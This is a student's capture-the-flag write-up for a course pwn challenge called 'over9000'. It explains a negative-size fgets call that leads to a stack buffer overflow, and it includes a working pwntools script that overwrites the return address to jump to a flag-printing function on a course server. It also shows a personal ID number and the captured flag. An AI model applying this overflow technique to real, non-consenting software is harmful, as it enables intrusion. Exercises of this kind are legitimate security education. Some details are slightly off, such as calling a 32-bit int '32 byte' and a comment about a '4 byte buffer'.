# Player
- Tim Niklas Gruel 1080 2021 2831
- username: realy0sh1

# Writeup: "over9000"
- story:  Can you outsmart Vegeta's scouter and make it read a power level that's truly over 9000? 
- start docker:
```
docker build -t over9000 .
echo 'flag{fake_flag}' > flag
docker run --rm --mount "type=bind,src=$(pwd)/flag,dst=/flag" --cap-add SYS_ADMIN --security-opt apparmor=unconfined -p 1024:1024 -ti over9000
nc 127.0.0.1 1024
```
- the souce code includes:
```
void measure_power_level(int scouter_capacity) {
    char power_level[SCOUTER_DIGITS];
    printf("Vegeta: Let's see what Kakarot's power level is with this new scouter.\n");
    fgets(power_level, scouter_capacity - 1, stdin);
    printf("Vegeta: Hmph! It's only %s\n", power_level);
}
```
- we can input a 15bit number as string (15 chars + Null)
- we have int = 32 byte
    - max (positive) number: 0b0111...1111 (2^31 - 1)
    - max (negative) number: 0b1000...0000 (-2^31)
- we input max negative number = -2^31 = -2.147.483.648 (needs 11 chars + Null)
```
-2147483648
```
- the buffer "power_level" is only 16 Bytes, but we can write 2^31 -1 bytes if we want (or until newline) 
- there is no canary, we can just override the return address
- there is no PIE => 0x400000 aka no ASLR, so we now addresses beforehand
- => we can override return address with well-known address of its_over_9000, which will directly print the flag for us:)
- IDA says that is starts at 0x401176
- we overflow the buffer of function: measure_power_level, which stack looks like:
```
-0000000000000020 // Use data definition commands to manipulate stack variables and arguments.
-0000000000000020 // Frame size: 20; Saved regs: 8; Purge: 0
-0000000000000020
-0000000000000020     // padding byte
-000000000000001F     // padding byte
-000000000000001E     // padding byte
-000000000000001D     // padding byte
-000000000000001C     // padding byte
-000000000000001B     // padding byte
-000000000000001A     // padding byte
-0000000000000019     // padding byte
-0000000000000018     // padding byte
-0000000000000017     // padding byte
-0000000000000016     // padding byte
-0000000000000015     // padding byte
-0000000000000014     _DWORD var_14;
-0000000000000010     // padding byte
-000000000000000F     // padding byte
-000000000000000E     // padding byte
-000000000000000D     // padding byte
-000000000000000C     // padding byte
-000000000000000B     // padding byte
-000000000000000A     // padding byte
-0000000000000009     // padding byte
-0000000000000008     // padding byte
-0000000000000007     // padding byte
-0000000000000006     // padding byte
-0000000000000005     // padding byte
-0000000000000004     char s;
-0000000000000003     // padding byte
-0000000000000002     // padding byte
-0000000000000001     // padding byte
+0000000000000000     _QWORD __saved_registers;
+0000000000000008     _UNKNOWN *__return_address;
+0000000000000010
+0000000000000010 // end of stack variables
```
- we need 4+8=12 Bytes padding and then just write return address, thats it
```
#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
conn = pwn.remote('tasks.ws24.softsec.rub.de', 33233)
#conn = pwn.remote('127.0.0.1', 1024)

#conn = pwn.process('./vuln')
#pwn.gdb.attach(conn)

# 4 byte buffer + rbp
shellcode = b'A' * (4+8) + pwn.p64(0x401176) + b'\n'
print(shellcode.hex()) 

conn.recvuntil(b'Nappa: Hey Vegeta, how many digits can your new scouter display?\n')
conn.sendline("-2147483648".encode())
conn.recvuntil("Vegeta: Let's see what Kakarot's power level is with this new scouter.\n")
conn.send(shellcode)
conn.interactive()
```
- flag: 
```
softsec{kQI5ODVWhM07lDbIdo-UDLKWC4zDUwYktQRB0VCicTOS0GCpL75UKptB--sgo24o}
```